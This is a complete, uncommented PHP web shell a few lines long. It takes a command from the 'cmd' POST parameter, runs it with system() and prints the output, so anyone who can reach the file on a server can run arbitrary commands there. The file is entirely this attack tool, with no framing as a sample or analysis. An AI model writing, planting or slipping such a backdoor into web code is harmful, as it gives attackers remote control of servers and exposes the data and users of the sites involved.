<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
